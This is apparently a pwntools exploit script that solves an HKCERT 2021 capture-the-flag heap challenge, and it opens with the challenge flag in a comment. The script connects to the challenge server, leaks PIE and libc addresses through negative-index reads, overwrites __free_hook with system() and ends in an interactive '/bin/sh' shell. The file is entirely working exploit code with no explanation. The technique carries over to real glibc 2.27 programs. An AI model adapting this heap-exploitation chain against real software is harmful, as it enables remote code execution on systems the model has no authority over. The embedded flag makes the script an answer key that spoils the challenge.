# hkcert21{L1bC_vers10n_matters_1n_pvvN}
from pwn import *

elf = ELF("./chall")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

#target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote("chalp.hkcert21.pwnable.hk", 38231)

def sa(s, d):
    target.sendafter(s, str(d))

def sla(s, d):
    sa(s, str(d)+"\n")

def eat_cookie():
    sla(">", 1)

def create(size=0x13, cookie="whoamiT"):
    sla(">", 2)
    sla("?", size)
    sa(":", cookie)
    print ".",

def edit(idx, msg):
    sla(">", 3)
    sla(":", idx)
    sa(":", msg)

def view(idx):
    sla(">", 4)
    sla(": ", idx)
    return target.recvline().strip()

for i in range(22):
    create()

pie_leak = u64(view(-11).ljust(8, '\x00'))
print
log.info("PIE Leak: " + hex(pie_leak))

edit(-11, '\x40')
libc_base = u64(view(-11).ljust(8, '\x00')) - libc.sym['_IO_2_1_stderr_']
log.info("LIBC Base: " + hex(libc_base))

edit(-11, p64(libc_base + libc.sym['_IO_2_1_stderr_']) + p64(0)*3 + p64(libc_base + libc.sym['__free_hook'] - 8)*32)
edit(0, "/bin/sh\x00" + p64(libc_base + libc.sym['system']))

eat_cookie()

target.interactive()
